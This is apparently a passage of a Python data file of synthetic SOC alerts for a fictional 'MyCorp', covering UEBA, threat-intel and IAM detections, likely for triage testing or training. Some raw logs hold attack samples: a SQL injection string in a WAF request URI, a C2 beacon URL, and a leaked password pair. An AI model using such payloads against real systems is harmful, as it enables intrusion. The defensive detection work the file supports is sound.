        "description": "Numerous failed login attempts against account s.brown originating from multiple distinct external IPs—indicative of distributed brute force attack.",
        "artifact": [
            {"type": "target_username", "value": "s.brown"},
            {"type": "failed_logins", "value": 58},
            {"type": "source_ip_count", "value": 12},
            {"type": "time_window_minutes", "value": 10}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T05:40:54.666Z",
            "event_type": "AuthenticationAnomaly",
            "user_details": {"username": "s.brown", "department": "Sales"},
            "behavioral_details": {
                "failed_login_rate": 5.8,
                "failed_login_rate_score": 9.2,
                "ip_source_entropy": 7.1
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-04-Service-Account-Unusual-Access",
        "rule_name": "Service account unusual access",
        "alert_date": "2025-09-23T14:50:30Z",
        "tags": ["service-account", "anomaly", "privilege-escalation"],
        "severity": "High",
        "reference": "Service account SVC-APP-01 accessed sensitive database",
        "description": "Service account SVC-APP-01 normally limited to application communication attempted access to customer PII database—significant behavior deviation.",
        "artifact": [
            {"type": "account_name", "value": "SVC-APP-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "action", "value": "Database Query"},
            {"type": "target_resource", "value": "DB-CUSTOMER-PII"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T14:50:29.999Z",
            "event_type": "ServiceAccountAnomaly",
            "entity_details": {"entity_name": "SVC-APP-01", "entity_type": "Service Account"},
            "behavioral_details": {
                "normal_access_patterns": ["App-DB-01", "App-API-Gateway"],
                "current_access_target_deviation": 9.9
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-05-Insider-Trading-Recon",
        "rule_name": "Suspicious internal reconnaissance activity",
        "alert_date": "2025-09-23T10:25:40Z",
        "tags": ["insider-threat", "reconnaissance", "data-exfiltration"],
        "severity": "Medium",
        "reference": "User l.wang searched for confidential project files",
        "description": "User l.wang (out-of-scope department) repeatedly searched for and accessed confidential 'Project Chimera' files—outside normal duties.",
        "artifact": [
            {"type": "username", "value": "l.wang"},
            {"type": "source_ip", "value": "192.168.1.55"},
            {"type": "search_keywords", "value": ["Project Chimera", "acquisition", "financial model"]},
            {"type": "file_access_count", "value": 20}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T10:25:39.111Z",
            "event_type": "FileAccessAnomaly",
            "user_details": {"username": "l.wang", "department": "Marketing"},
            "behavioral_details": {
                "normal_file_access_path": ["/marketing/", "/campaigns/"],
                "abnormal_file_access_path": ["/finance/projects/"]
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-06-Geographic-Login-Impossible-Travel",
        "rule_name": "Geographically impossible login (impossible travel)",
        "alert_date": "2025-09-23T08:10:15Z",
        "tags": ["impossible-travel", "geolocation", "compromised-account"],
        "severity": "High",
        "reference": "User m.li logged in from two countries within minutes",
        "description": "Account m.li logged in from China and United States within 10 minutes—physically impossible, strong indication of compromise.",
        "artifact": [
            {"type": "username", "value": "m.li"},
            {"type": "login_1_ip", "value": "203.0.113.1"},
            {"type": "login_1_country", "value": "China"},
            {"type": "login_2_ip", "value": "198.51.100.25"},
            {"type": "login_2_country", "value": "United States"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T08:10:14.543Z",
            "event_type": "ImpossibleTravel",
            "user_details": {"username": "m.li", "department": "R&D"},
            "behavioral_details": {
                "time_between_logins_min": 10,
                "distance_km": 11000,
                "speed_kph": 66000
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-07-Workstation-Communication-Anomaly",
        "rule_name": "Workstation communication anomaly",
        "alert_date": "2025-09-23T13:45:00Z",
        "tags": ["network-anomaly", "workstation", "c2"],
        "severity": "Medium",
        "reference": "WKS-ENG-12 communicating with unusual host",
        "description": "Engineering workstation WKS-ENG-12 began high-frequency communications with atypical internal host—deviation from baseline, potential compromise or reconnaissance.",
        "artifact": [
            {"type": "hostname", "value": "WKS-ENG-12"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "192.168.5.88"},
            {"type": "protocol", "value": "TCP", "port": 4444}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T13:44:59.123Z",
            "event_type": "NetworkFlowAnomaly",
            "entity_details": {"entity_name": "WKS-ENG-12", "entity_type": "Workstation"},
            "behavioral_details": {
                "normal_destination_ips": ["192.168.4.1", "10.10.1.10"],
                "flow_deviation_score": 8.5
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-08-Excessive-Privilege-Use",
        "rule_name": "Excessive privileged account use",
        "alert_date": "2025-09-23T16:10:30Z",
        "tags": ["privileged-account", "escalation", "misuse"],
        "severity": "High",
        "reference": "Privileged account k.smith accessed salary data abnormally",
        "description": "Privileged account k.smith accessed sensitive employee salary database outside normal duties—potential misuse.",
        "artifact": [
            {"type": "username", "value": "k.smith"},
            {"type": "source_ip", "value": "192.168.1.200"},
            {"type": "resource", "value": "HR-Salary-DB"},
            {"type": "action", "value": "read"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T16:10:29.876Z",
            "event_type": "PrivilegedAccessAnomaly",
            "user_details": {"username": "k.smith", "department": "IT Operations"},
            "behavioral_details": {
                "normal_access_targets": ["IT-Asset-DB", "Network-Logs-DB"],
                "deviation_reason": "Access to out-of-scope database"
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-09-Mass-File-Renaming",
        "rule_name": "Mass file renaming/encryption",
        "alert_date": "2025-09-23T18:05:55Z",
        "tags": ["ransomware", "data-destruction", "file-anomaly"],
        "severity": "High",
        "reference": "Mass file renaming on host WKS-HR-03",
        "description": "Host WKS-HR-03 performed large volume of rapid file renames changing extensions to '.encrypted'—highly consistent with ransomware activity.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "file_change_count", "value": 250},
            {"type": "new_extension", "value": ".encrypted"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T18:05:54.666Z",
            "event_type": "HostFileAnomaly",
            "entity_details": {"entity_name": "WKS-HR-03", "entity_type": "Workstation"},
            "behavioral_details": {
                "file_change_rate": 50,
                "file_change_rate_score": 9.9,
                "reason": "Mass file renaming/encryption pattern"
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-10-Account-Creation-Anomaly",
        "rule_name": "Account creation anomaly",
        "alert_date": "2025-09-23T20:45:10Z",
        "tags": ["account-management", "anomaly", "privilege-escalation"],
        "severity": "Medium",
        "reference": "Non-IT admin account created new user",
        "description": "Non-IT admin account n.jones created a new high-privilege user after hours—significant deviation from normal responsibilities.",
        "artifact": [
            {"type": "actor_username", "value": "n.jones"},
            {"type": "source_ip", "value": "192.168.1.120"},
            {"type": "action", "value": "user_creation"},
            {"type": "new_username", "value": "temp_admin_user"}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T20:45:09.111Z",
            "event_type": "AccountManagementAnomaly",
            "user_details": {"username": "n.jones", "department": "Facilities"},
            "behavioral_details": {
                "normal_activities": ["door-access-control", "HVAC-management"],
                "deviation_reason": "Out-of-scope user management activity"
            }
        }
    }
]
ti_alert = [
    {
        "source": "TI",
        "rule_id": "TI-Rule-01-Malicious-IP-Inbound",
        "rule_name": "Inbound connection from malicious IP",
        "alert_date": "2025-09-23T20:50:00Z",
        "tags": ["malicious-ip", "reconnaissance", "botnet"],
        "severity": "High",
        "reference": "Scan attempt from Russian botnet IP",
        "description": "Firewall logs show malicious IP 185.22.67.123 (known botnet infrastructure) attempting connection to internal network.",
        "artifact": [
            {"type": "source_ip", "value": "185.22.67.123"},
            {"type": "destination_ip", "value": "10.10.10.50"},
            {"type": "country", "value": "Russia"},
            {"type": "threat_list", "value": "Botnet C2 IPs"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T20:49:59.876Z",
            "action": "DENY",
            "protocol": "TCP",
            "src_ip": "185.22.67.123",
            "dst_ip": "10.10.10.50",
            "dst_port": 22,
            "rule_name": "deny_all_malicious_ips"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-02-C2-Domain-Outbound",
        "rule_name": "Internal host attempted C2 domain connection",
        "alert_date": "2025-09-23T20:55:30Z",
        "tags": ["c2", "malware", "outbound"],
        "severity": "Critical",
        "reference": "Host WKS-HR-03 attempted connection to malicious C2 domain",
        "description": "Internal host WKS-HR-03 (192.168.2.150) attempted proxy-mediated connection to domain flagged as command and control (C2).",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "destination_domain", "value": "evil.c2-server.net"},
            {"type": "threat_list", "value": "APT C2 Domains"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T20:55:29.987Z",
            "action": "BLOCK",
            "user": "j.smith",
            "src_ip": "192.168.2.150",
            "url": "http://evil.c2-server.net/beacon"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-03-Malicious-File-Hash-Match",
        "rule_name": "Internal file hash matched threat intel",
        "alert_date": "2025-09-23T21:00:15Z",
        "tags": ["malware", "file-hash", "endpoint"],
        "severity": "High",
        "reference": "Malicious file found on host FIN-WKS-JDOE-05",
        "description": "Endpoint logs show file on host FIN-WKS-JDOE-05 with SHA256 hash matching known ransomware indicator.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "file_path", "value": "C:\\Users\\j.doe\\Downloads\\invoice.exe"},
            {"type": "file_hash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"},
            {"type": "threat_list", "value": "Ransomware Hashes"}
        ],
        "raw_log": {
            "source_type": "EDR",
            "timestamp": "2025-09-23T21:00:14.654Z",
            "event_name": "File_Creation_Detected",
            "file_hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
            "file_path": "C:\\Users\\j.doe\\Downloads\\invoice.exe"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-04-Phishing-URL-Access",
        "rule_name": "Phishing URL accessed",
        "alert_date": "2025-09-23T21:05:40Z",
        "tags": ["phishing", "url-threat"],
        "severity": "Medium",
        "reference": "User d.chen accessed phishing URL",
        "description": "User d.chen accessed URL flagged by threat intel as phishing—access allowed but requires investigation.",
        "artifact": [
            {"type": "username", "value": "d.chen"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "url", "value": "http://my-corp-sso-secure.cc/login"},
            {"type": "threat_list", "value": "Phishing URLs"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T21:05:39.111Z",
            "action": "ALLOW",
            "user": "d.chen",
            "src_ip": "192.168.4.12",
            "url": "http://my-corp-sso-secure.cc/login"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-05-Known-Vulnerability-Scan",
        "rule_name": "Known vulnerability scan activity",
        "alert_date": "2025-09-23T21:10:20Z",
        "tags": ["vulnerability", "scan", "reconnaissance"],
        "severity": "High",
        "reference": "Log4j vulnerability scan from IP 104.22.56.78",
        "description": "Traffic from IP 104.22.56.78 matches Log4j (CVE-2021-44228) scanning signature—IP listed among malicious scanners.",
        "artifact": [
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "destination_ip", "value": "10.10.10.200"},
            {"type": "vulnerability", "value": "Log4j (CVE-2021-44228)"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T21:10:19.456Z",
            "action": "DROP",
            "src_ip": "104.22.56.78",
            "dst_ip": "10.10.10.200",
            "signature_id": "IDS_Log4j_Scan_Pattern"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-06-Data-Exfiltration-Endpoint-Match",
        "rule_name": "Connection to data exfiltration endpoint",
        "alert_date": "2025-09-23T21:15:50Z",
        "tags": ["exfiltration", "data-theft"],
        "severity": "Medium",
        "reference": "Host WKS-ENG-12 connected to data exfiltration endpoint",
        "description": "Host WKS-ENG-12 (192.168.4.12) attempted connection to IP 45.33.20.10 flagged as data exfiltration endpoint.",
        "artifact": [
            {"type": "hostname", "value": "WKS-ENG-12"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "45.33.20.10"},
            {"type": "threat_list", "value": "Data Exfiltration Endpoints"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:15:49.123Z",
            "action": "BLOCK",
            "src_ip": "192.168.4.12",
            "dst_ip": "45.33.20.10",
            "dst_port": 80
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-07-Malicious-Domain-DNS-Query",
        "rule_name": "DNS query for malicious domain",
        "alert_date": "2025-09-23T21:20:10Z",
        "tags": ["dns", "malware"],
        "severity": "Medium",
        "reference": "Host IT-ADMIN-01 queried malicious domain",
        "description": "Host IT-ADMIN-01 (192.168.10.5) queried domain listed as malware distribution site.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.10.5"},
            {"type": "query_domain", "value": "malware-repo.xyz"},
            {"type": "threat_list", "value": "Malware Drop Zones"}
        ],
        "raw_log": {
            "source_type": "DNS",
            "timestamp": "2025-09-23T21:20:09.543Z",
            "src_ip": "192.168.10.5",
            "query_domain": "malware-repo.xyz",
            "response": "blocked"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-08-Suspicious-Country-Access",
        "rule_name": "Connection from restricted country",
        "alert_date": "2025-09-23T21:25:00Z",
        "tags": ["geofencing", "risk-country"],
        "severity": "Low",
        "reference": "Connection attempt from restricted country (North Korea)",
        "description": "Connection attempt from IP 175.45.176.1 associated with high-risk restricted country (North Korea).",
        "artifact": [
            {"type": "source_ip", "value": "175.45.176.1"},
            {"type": "country", "value": "North Korea"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:24:59.000Z",
            "action": "DENY",
            "src_ip": "175.45.176.1",
            "dst_ip": "52.8.10.20",
            "dst_port": 443,
            "rule_name": "geo_block_north_korea"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-09-Compromised-Account-Credential",
        "rule_name": "Internal account credentials found on dark web",
        "alert_date": "2025-09-23T21:30:35Z",
        "tags": ["compromised-credentials", "darkweb", "insider-threat"],
        "severity": "High",
        "reference": "Credentials for account l.wang found in dark web dump",
        "description": "Threat intel reports user l.wang credentials (username/password) discovered in compromised dark web database.",
        "artifact": [
            {"type": "username", "value": "l.wang"},
            {"type": "email", "value": "l.wang@mycorp.com"},
            {"type": "leak_source", "value": "Dark Web Credential Dump"}
        ],
        "raw_log": {
            "source_type": "Threat Intelligence Feed",
            "timestamp": "2025-09-23T21:30:34.888Z",
            "alert_source": "credential-monitoring-service",
            "details": "Credential 'l.wang@mycorp.com:password123' found in pastebin dump."
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-10-Honeypot-Interaction",
        "rule_name": "Interaction with corporate honeypot",
        "alert_date": "2025-09-23T21:35:10Z",
        "tags": ["honeypot", "attacker-activity", "reconnaissance"],
        "severity": "Medium",
        "reference": "IP 1.1.1.1 interacted with honeypot service",
        "description": "IP 1.1.1.1 (likely attacker) established connection with internal honeypot—indicates targeted reconnaissance or attack attempt.",
        "artifact": [
            {"type": "source_ip", "value": "1.1.1.1"},
            {"type": "destination_ip", "value": "10.10.10.250"},
            {"type": "device_type", "value": "Honeypot"}
        ],
        "raw_log": {
            "source_type": "Honeypot",
            "timestamp": "2025-09-23T21:35:09.999Z",
            "action": "ATTEMPTED_ACCESS",
            "src_ip": "1.1.1.1",
            "dst_ip": "10.10.10.250",
            "dst_port": 21,
            "service": "ftp"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-11-Malicious-IP-Outbound",
        "rule_name": "Internal host connected to malicious IP",
        "alert_date": "2025-09-23T21:40:05Z",
        "tags": ["malicious-ip", "outbound", "botnet"],
        "severity": "High",
        "reference": "Host WKS-HR-03 attempted connection to malicious IP",
        "description": "Host WKS-HR-03 (192.168.2.150) attempted connection to infrastructure IP 5.6.7.8 listed as malicious.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "destination_ip", "value": "5.6.7.8"},
            {"type": "threat_list", "value": "Malicious IPs"}
        ],
        "raw_log": {
            "source_type": "Firewall",
            "timestamp": "2025-09-23T21:40:04.999Z",
            "action": "DENY",
            "src_ip": "192.168.2.150",
            "dst_ip": "5.6.7.8",
            "dst_port": 443
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-12-Suspicious-URL-Inbound",
        "rule_name": "Suspicious URL in inbound email",
        "alert_date": "2025-09-23T21:45:30Z",
        "tags": ["phishing", "email"],
        "severity": "Medium",
        "reference": "Suspicious URL detected in inbound email",
        "description": "Email security gateway detected inbound email containing URL flagged as suspicious/phishing by threat intel.",
        "artifact": [
            {"type": "sender_email", "value": "noreply@sso-update.com"},
            {"type": "url", "value": "https://sso-update.mycorp.io"},
            {"type": "threat_list", "value": "Suspicious URLs"}
        ],
        "raw_log": {
            "source_type": "Email Gateway",
            "timestamp": "2025-09-23T21:45:29.876Z",
            "action": "QUARANTINE",
            "sender": "noreply@sso-update.com",
            "recipient": "j.doe@mycorp.com",
            "subject": "Important Security Notice",
            "body_snippet": "Please update your password via this link: https://sso-update.mycorp.io"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-13-Known-Attacker-IP",
        "rule_name": "Interaction with known attacker IP",
        "alert_date": "2025-09-23T21:50:00Z",
        "tags": ["apt", "attacker", "reconnaissance"],
        "severity": "Critical",
        "reference": "Scan from APT-associated IP",
        "description": "Traffic from IP 103.203.20.12 associated with APT group detected scanning internal asset.",
        "artifact": [
            {"type": "source_ip", "value": "103.203.20.12"},
            {"type": "threat_actor", "value": "Fancy Bear"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T21:49:59.000Z",
            "action": "ALERT",
            "src_ip": "103.203.20.12",
            "dst_ip": "10.10.10.50",
            "signature_id": "IDS_Known_APT_Scan"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-14-Ransomware-Hash-Downloaded",
        "rule_name": "Ransomware hash file downloaded",
        "alert_date": "2025-09-23T21:55:45Z",
        "tags": ["ransomware", "download", "endpoint"],
        "severity": "Critical",
        "reference": "Host MKT-WKS-ASMITH-01 downloaded ransomware file",
        "description": "Endpoint logs show file downloaded on host MKT-WKS-ASMITH-01 matching known ransomware hash.",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "file_hash_sha256", "value": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2"},
            {"type": "file_path", "value": "C:\\Users\\a.smith\\Downloads\\document.zip"}
        ],
        "raw_log": {
            "source_type": "EDR",
            "timestamp": "2025-09-23T21:55:44.888Z",
            "event_name": "File_Download_Detected",
            "file_hash_sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
            "file_path": "C:\\Users\\a.smith\\Downloads\\document.zip"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-15-Cryptocurrency-Miner-Domain",
        "rule_name": "Cryptocurrency mining domain connection",
        "alert_date": "2025-09-23T22:00:20Z",
        "tags": ["cryptomining", "malware"],
        "severity": "Medium",
        "reference": "Host FIN-WKS-JDOE-05 attempted connection to crypto mining pool",
        "description": "Host FIN-WKS-JDOE-05 attempted connection to domain flagged as cryptocurrency mining pool.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "mine-xmr.pool.net"}
        ],
        "raw_log": {
            "source_type": "Proxy",
            "timestamp": "2025-09-23T22:00:19.999Z",
            "action": "BLOCK",
            "user": "j.doe",
            "src_ip": "192.168.1.101",
            "url": "http://mine-xmr.pool.net/miner"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-16-Dark-Web-Mention",
        "rule_name": "Company mentioned on dark web",
        "alert_date": "2025-09-23T22:05:00Z",
        "tags": ["darkweb", "intel", "breach"],
        "severity": "High",
        "reference": "Dark web forum mention of company and leaked data",
        "description": "Dark web hacker forum post mentions company name 'MyCorp' with link to leaked employee data.",
        "artifact": [
            {"type": "company_name", "value": "MyCorp"},
            {"type": "leak_type", "value": "Employee Data"}
        ],
        "raw_log": {
            "source_type": "Dark Web Monitor",
            "timestamp": "2025-09-23T22:04:59.000Z",
            "details": "Post on 'Breach Forums' discussing 'MyCorp' and 'staff email list'"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-17-Malicious-IP-Port-Scan",
        "rule_name": "Port scan from malicious IP",
        "alert_date": "2025-09-23T22:10:30Z",
        "tags": ["malicious-ip", "reconnaissance", "port-scan"],
        "severity": "Medium",
        "reference": "Large-scale port scan from IP 134.119.50.60",
        "description": "Known malicious IP 134.119.50.60 performed large-scale port scan of internal assets seeking open services.",
        "artifact": [
            {"type": "source_ip", "value": "134.119.50.60"},
            {"type": "destination_ip", "value": "10.10.10.0/24"},
            {"type": "threat_list", "value": "Malicious Scanners"}
        ],
        "raw_log": {
            "source_type": "IPS/IDS",
            "timestamp": "2025-09-23T22:10:29.876Z",
            "action": "ALERT",
            "src_ip": "134.119.50.60",
            "dst_ip": "10.10.10.10, 10.10.10.20, ...",
            "signature_id": "Port_Scan_TCP_Syn"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-18-Spear-Phishing-Email-Detected",
        "rule_name": "Spear phishing email detected",
        "alert_date": "2025-09-23T22:15:15Z",
        "tags": ["spear-phishing", "email"],
        "severity": "High",
        "reference": "Spear phishing email targeting CEO",
        "description": "Email targeting CEO (j.smith@mycorp.com) impersonated customer communication and included malicious attachment.",
        "artifact": [
            {"type": "recipient_email", "value": "j.smith@mycorp.com"},
            {"type": "sender_email", "value": "info@customer-relations-co.org"},
            {"type": "subject", "value": "Regarding Q3 contract renewal"}
        ],
        "raw_log": {
            "source_type": "Email Gateway",
            "timestamp": "2025-09-23T22:15:14.666Z",
            "action": "BLOCK",
            "sender": "info@customer-relations-co.org",
            "recipient": "j.smith@mycorp.com",
            "subject": "Regarding Q3 contract renewal",
            "threat_details": "Targeted phishing, known malicious sender, attachment scan"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-19-Vulnerability-Exploit-Attempt",
        "rule_name": "Known vulnerability exploit attempt",
        "alert_date": "2025-09-23T22:20:00Z",
        "tags": ["vulnerability", "exploit", "attack"],
        "severity": "Critical",
        "reference": "SQL injection attempt against web server",
        "description": "Web Application Firewall detected SQL injection attempt targeting web server (10.10.10.100) matching known attack patterns.",
        "artifact": [
            {"type": "source_ip", "value": "172.67.100.200"},
            {"type": "destination_ip", "value": "10.10.10.100"},
            {"type": "attack_type", "value": "SQL Injection"}
        ],
        "raw_log": {
            "source_type": "WAF",
            "timestamp": "2025-09-23T22:19:59.123Z",
            "action": "BLOCK",
            "src_ip": "172.67.100.200",
            "dst_ip": "10.10.10.100",
            "request_uri": "/api/users?id=' OR 1=1 --",
            "rule_id": "WAF_SQLI_Rule_01"
        }
    },
    {
        "source": "TI",
        "rule_id": "TI-Rule-20-Social-Media-Threat-Mention",
        "rule_name": "Company targeted mention on social media",
        "alert_date": "2025-09-23T22:25:00Z",
        "tags": ["social-media", "intel", "targeting"],
        "severity": "Medium",
        "reference": "Twitter post mentions company as attack target",
        "description": "Suspicious Twitter account posted about targeting 'MyCorp' in an upcoming attack.",
        "artifact": [
            {"type": "platform", "value": "Twitter"},
            {"type": "mention_text", "value": "MyCorp is next. #breach"},
            {"type": "threat_actor_alias", "value": "CyberViking"}
        ],
        "raw_log": {
            "source_type": "Social Media Monitor",
            "timestamp": "2025-09-23T22:24:59.000Z",
            "details": "Tweet by user @CyberViking: 'MyCorp is next. #breach #hack'"
        }
    }
]

iam_alert = [
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-01-Excessive-Permission-Grant",
        "rule_name": "Account permission elevation anomaly",
        "alert_date": "2025-09-23T23:05:00Z",
        "tags": ["privilege-escalation", "iam", "access-anomaly"],
        "severity": "High",
        "reference": "User j.doe granted sensitive admin privileges",
        "description": "Account j.doe granted 'Global Administrator' role outside IT admin process and beyond normal duties—possible privilege escalation attack.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "actor_account", "value": "l.smith"},
            {"type": "permission_granted", "value": "Global Administrator"},
            {"type": "platform", "value": "Azure AD"}
        ],
        "raw_log": {
            "service": "Azure AD",
            "timestamp": "2025-09-23T23:04:59.888Z",
            "event_type": "RoleAssignment",
            "actor": {"user_id": "l.smith"},
            "target": {"user_id": "j.doe"},
            "details": {"role": "Global Administrator", "reason": "Unjustified elevation"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-02-Impossible-Travel-Login",
        "rule_name": "Impossible travel login",
        "alert_date": "2025-09-23T23:10:30Z",
        "tags": ["impossible-travel", "geolocation", "compromised-account"],
        "severity": "High",
        "reference": "User c.jones account logged in from two locations",
        "description": "Account c.jones logged in from USA and Japan within 10 minutes—physically impossible, likely compromised.",
        "artifact": [
            {"type": "username", "value": "c.jones"},
            {"type": "login_1_ip", "value": "198.51.100.25"},
            {"type": "login_1_location", "value": "New York, USA"},
            {"type": "login_2_ip", "value": "203.0.113.50"},
            {"type": "login_2_location", "value": "Tokyo, Japan"}
        ],
        "raw_log": {
            "service": "Okta",
            "timestamp": "2025-09-23T23:10:29.987Z",
            "event_type": "AuthenticationSuccess",
            "user": {"username": "c.jones"},
            "geolocations": [{"country": "USA", "ip": "198.51.100.25"}, {"country": "Japan", "ip": "203.0.113.50"}],
            "details": {"time_between_logins_min": 10}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-03-Brute-Force-Attack-Password-Spraying",
        "rule_name": "Multi-account password spraying attack",
        "alert_date": "2025-09-23T23:15:20Z",
        "tags": ["brute-force", "password-spraying", "authentication"],
        "severity": "High",
        "reference": "Password spraying attack from IP 104.22.56.78",
        "description": "Single IP 104.22.56.78 generated numerous failed logins across multiple accounts—pattern consistent with password spraying.",
        "artifact": [
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "failed_logins", "value": 50},
            {"type": "target_user_count", "value": 10}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:15:19.444Z",
            "event_type": "AuthenticationFailure",
            "src_ip": "104.22.56.78",
            "details": {"target_users": ["j.doe", "a.smith", "c.jones", "..."], "password_attempted": "Spring2025!"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-04-New-Privileged-Account-Created",
        "rule_name": "Unauthorized privileged account creation",
        "alert_date": "2025-09-23T23:20:55Z",
        "tags": ["account-creation", "privileged-account", "insider-threat"],
        "severity": "Medium",
        "reference": "Non-IT admin account created new privileged user",
        "description": "Non-IT admin account s.brown created high-privilege user 'temp_admin_user' after hours.",
        "artifact": [
            {"type": "actor_username", "value": "s.brown"},
            {"type": "new_username", "value": "temp_admin_user"},
            {"type": "source_ip", "value": "192.168.1.55"},
            {"type": "time_of_day", "value": "After-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:20:54.666Z",
            "event_type": "UserCreation",
            "actor": {"username": "s.brown", "department": "Facilities"},
            "target": {"username": "temp_admin_user", "groups": ["Domain Admins"]}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-05-Unusual-API-Call-Cloud",
        "rule_name": "Cloud service account anomalous API call",
        "alert_date": "2025-09-23T23:25:40Z",
        "tags": ["cloud-security", "iam", "api-call-anomaly"],
        "severity": "High",
        "reference": "AWS account 'App-Service' API call from unusual region",
        "description": "AWS service account 'App-Service' made 'EC2 StartInstances' API call from EU region instead of normal US-East—location anomaly.",
        "artifact": [
            {"type": "account_name", "value": "App-Service"},
            {"type": "api_call", "value": "EC2:StartInstances"},
            {"type": "source_region", "value": "eu-west-1"},
            {"type": "normal_region", "value": "us-east-1"}
        ],
        "raw_log": {
            "service": "AWS CloudTrail",
            "timestamp": "2025-09-23T23:25:39.111Z",
            "event_name": "StartInstances",
            "user_identity": {"type": "AssumedRole", "principal_id": "App-Service"},
            "source_ip_address": "85.234.11.22",
            "aws_region": "eu-west-1"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-06-Multiple-Failed-MFA-Attempts",
        "rule_name": "Multiple failed MFA attempts",
        "alert_date": "2025-09-23T23:30:10Z",
        "tags": ["mfa", "authentication", "brute-force"],
        "severity": "Medium",
        "reference": "User h.lin multiple failed MFA challenges",
        "description": "User h.lin had multiple failed MFA attempts in short period—may indicate attacker with password attempting MFA bypass.",
        "artifact": [
            {"type": "username", "value": "h.lin"},
            {"type": "failed_attempts", "value": 5},
            {"type": "source_ip", "value": "203.0.113.100"},
            {"type": "mfa_method", "value": "TOTP"}
        ],
        "raw_log": {
            "service": "Okta",
            "timestamp": "2025-09-23T23:30:09.543Z",
            "event_type": "AuthenticationFailure",
            "user": {"username": "h.lin"},
            "details": {"reason": "MFA challenge failed", "mfa_method": "TOTP"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-07-Admin-Password-Reset-Anomaly",
        "rule_name": "Admin account password reset anomaly",
        "alert_date": "2025-09-23T23:35:00Z",
